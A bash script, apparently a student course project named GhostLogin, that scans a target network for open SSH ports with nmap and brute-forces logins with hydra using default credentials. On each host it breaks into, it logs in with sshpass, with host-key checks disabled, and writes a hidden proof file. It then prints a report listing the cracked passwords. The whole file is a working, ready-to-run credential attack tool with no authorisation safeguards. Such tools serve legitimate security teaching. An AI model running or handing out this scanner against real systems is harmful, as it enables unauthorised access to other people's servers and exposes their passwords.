#!/bin/bash
# Project:  GhostLogin - Automated SSH Scanner
# Student:  Lihi Yaari (s19)
# Class:    NX201
# Lecturer: Michael Kaliot
# Unit:     PERES25A

SUCCESS_LOG="access_log.txt"
SCAN_FILE="scan_results.txt"
DEFAULT_CREDS="creds.txt"
USERS="users.txt"
PASS="passwords.txt"
HYDRA_TMP="hydra_temp.txt"

CREDS_FILE=""
CREDS_CREATED=0
SUCCESSFUL=()

# colors for output
RED=$(tput setaf 1 2>/dev/null || true)
YELLOW=$(tput setaf 3 2>/dev/null || true)
RESET=$(tput sgr0 2>/dev/null || true)

BEEP=1

# helper functions

check_ip_parts() {
  local ip="$1"
  local a b c d
  IFS='.' read -r a b c d <<< "$ip"

  for x in "$a" "$b" "$c" "$d"; do
    [[ "$x" =~ ^[0-9]+$ ]] || return 1
    [ "$x" -ge 0 ] && [ "$x" -le 255 ] || return 1
  done
  return 0
}

REASON=""

validate_target() {
  local target="$1"
  REASON=""

  if [[ ! "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]{1,2}|-[0-9]{1,3})?$ ]]; then
    REASON="Not a valid IP format"
    return 1
  fi

  # single IP
  if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    if ! check_ip_parts "$target"; then
      REASON="IP numbers must be 0-255"
      return 1
    fi
    return 0
  fi

  # CIDR
  if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
    local ip_part mask
    ip_part="${target%/*}"
    mask="${target#*/}"

    if ! check_ip_parts "$ip_part"; then
      REASON="IP numbers must be 0-255"
      return 1
    fi

    if [[ ! "$mask" =~ ^[0-9]+$ ]] || [ "$mask" -lt 0 ] || [ "$mask" -gt 32 ]; then
      REASON="CIDR mask must be 0-32"
      return 1
    fi

    return 0
  fi

  # range
  if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-[0-9]{1,3}$ ]]; then
    local base_ip end start
    base_ip="${target%-*}"
    end="${target##*-}"
    start="${base_ip##*.}"

    if ! check_ip_parts "$base_ip"; then
      REASON="IP numbers must be 0-255"
      return 1
    fi

    if [[ ! "$end" =~ ^[0-9]+$ ]] || [ "$end" -lt 0 ] || [ "$end" -gt 255 ]; then
      REASON="Range end must be 0-255"
      return 1
    fi

    if [ "$end" -lt "$start" ]; then
      REASON="Range end must be >= start"
      return 1
    fi

    return 0
  fi

  REASON="Not a valid IP format"
  return 1
}

extract_hydra_pair() {
  awk '
    {
      u=""; p="";
      for(i=1;i<=NF;i++){
        if($i=="login:"){u=$(i+1)}
        if($i=="password:"){p=$(i+1)}
      }
      if(u!="" && p!=""){print u "|" p}
    }' <<< "$1"
}

cleanup() {
  rm -f "$SCAN_FILE" "$USERS" "$PASS" "$HYDRA_TMP" 2>/dev/null
  if [ "$CREDS_CREATED" -eq 1 ]; then
    rm -f "$DEFAULT_CREDS" 2>/dev/null
  fi
}
trap cleanup EXIT

clear
echo "GhostLogin - SSH Scanner"
echo "------------------------"
: > "$SUCCESS_LOG"

# check tools
for t in nmap hydra sshpass; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "${RED}[ERROR] Missing tool: $t${RESET}"
    echo "${YELLOW}Please install it and run again.${RESET}"
    exit 1
  fi
done

# target input
while true; do
  echo -n "Enter target (IP / CIDR / range): "
  read -r TARGET

  if validate_target "$TARGET"; then
    break
  fi

  echo "${RED}[ERROR] Invalid target.${RESET}"
  echo "${YELLOW}Reason: $REASON${RESET}"
  echo "Try again."
done

# scan SSH
echo "[+] Scanning for SSH (port 22) ..."
nmap -n -T4 -p 22 --open --max-retries 1 "$TARGET" -oG "$SCAN_FILE" >/dev/null 2>&1
ssh_hosts=$(grep "22/open" "$SCAN_FILE" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u)

if [ -z "$ssh_hosts" ]; then
  echo "[-] No SSH hosts found."
  exit 0
fi

echo "[+] SSH hosts found:"
echo "$ssh_hosts"
echo ""

# credentials source
while true; do
  echo "1) Built-in list"
  echo "2) Custom file"
  echo -n "Choice: "
  read -r choice
  [[ "$choice" == "1" || "$choice" == "2" ]] && break
  echo "${YELLOW}[!] Please choose 1 or 2.${RESET}"
done

if [[ "$choice" == "2" ]]; then
  echo -n "Path to credentials file: "
  read -r input_file
  if [ -f "$input_file" ]; then
    CREDS_FILE="$input_file"
    echo "[+] Using custom credentials file: $CREDS_FILE"
  else
    echo "${YELLOW}[!] File not found. Using built-in list.${RESET}"
  fi
fi

if [ -z "$CREDS_FILE" ] || [ ! -f "$CREDS_FILE" ]; then
  cat > "$DEFAULT_CREDS" << EOF
root:root
admin:admin
user:user
lg:1234
EOF
  CREDS_FILE="$DEFAULT_CREDS"
  CREDS_CREATED=1
  echo "[+] Using built-in credentials list."
fi

awk -F: 'NF>=2 {print $1}' "$CREDS_FILE" | sort -u > "$USERS"
awk -F: 'NF>=2 {print $2}' "$CREDS_FILE" | sort -u > "$PASS"

echo ""
echo "[*] Checking logins and creating proof file on success ..."
echo ""

poc_cmd='rm -f /tmp/.ghost_was_here; echo "GhostLogin proof - $(date)" > /tmp/.ghost_was_here; cat /tmp/.ghost_was_here'

while IFS= read -r host; do
  [ -z "$host" ] && continue
  echo "[*] Testing $host"

  hydra -L "$USERS" -P "$PASS" -u ssh://"$host" -o "$HYDRA_TMP" >/dev/null 2>&1

  successful_users_on_this_host=""

  if [ -s "$HYDRA_TMP" ] && grep -q "login:" "$HYDRA_TMP"; then
    while IFS= read -r line; do
      pair=$(extract_hydra_pair "$line")
      [ -z "$pair" ] && continue

      username="${pair%%|*}"
      password="${pair##*|}"

      successful_users_on_this_host="$successful_users_on_this_host $username"

      echo "[+] Login ok for $host (user: $username)"
      echo "[*] Creating proof file ..."

      output=$(sshpass -p "$password" ssh -n \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        "${username}@${host}" "$poc_cmd" 2>/dev/null)

      if echo "$output" | grep -q "GhostLogin proof -"; then
        echo "[+] Done on $host"
        if [ "$BEEP" -eq 1 ]; then echo -e "\a"; fi
        echo "$output"
        SUCCESSFUL+=("$host|$username|$password|VERIFIED")
        echo "HOST: $host | USER: $username | STATUS: VERIFIED | date: $(date)" >> "$SUCCESS_LOG"
      else
        echo "${YELLOW}[!] Login ok, but proof file not updated on $host${RESET}"
        SUCCESSFUL+=("$host|$username|$password|ACCESS_ONLY")
        echo "HOST: $host | USER: $username | STATUS: ACCESS_ONLY | date: $(date)" >> "$SUCCESS_LOG"
      fi
      echo ""
    done < <(grep "login:" "$HYDRA_TMP" | sort -u)
  else
    echo "[-] No valid credentials found for $host"
  fi

  while IFS= read -r u; do
    if [[ ! " $successful_users_on_this_host " =~ " $u " ]]; then
      SUCCESSFUL+=("$host|$u|---|FAILED")
      echo "HOST: $host | USER: $u | STATUS: FAILED | date: $(date)" >> "$SUCCESS_LOG"
    fi
  done < "$USERS"

  rm -f "$HYDRA_TMP" 2>/dev/null
  echo "---------------------------------------------------------------"
done <<< "$ssh_hosts"

echo ""
echo "GHOSTLOGIN FINAL REPORT"
echo "Finished: $(date)"
echo "==============================================================="
printf "%-16s | %-12s | %-14s | %-10s\n" "IP Address" "User" "Password" "Status"
echo "---------------------------------------------------------------"

if [ ${#SUCCESSFUL[@]} -eq 0 ]; then
  echo "No results."
else
  for x in "${SUCCESSFUL[@]}"; do
    IFS='|' read -r h u p s <<< "$x"
    if [ "$s" == "FAILED" ]; then
        printf "%-16s | %-12s | %-14s | ${RED}%-10s${RESET}\n" "$h" "$u" "$p" "$s"
    else
        printf "%-16s | %-12s | %-14s | ${YELLOW}%-10s${RESET}\n" "$h" "$u" "$p" "$s"
    fi
  done
fi

echo "---------------------------------------------------------------"

# summary
echo "Total SSH hosts found: $(echo "$ssh_hosts" | wc -l)"
echo "Total verified logins: $(printf '%s\n' "${SUCCESSFUL[@]}" | grep -c VERIFIED)"

echo "Proof file: /tmp/.ghost_was_here"
echo "Log file:   $SUCCESS_LOG"
echo ""
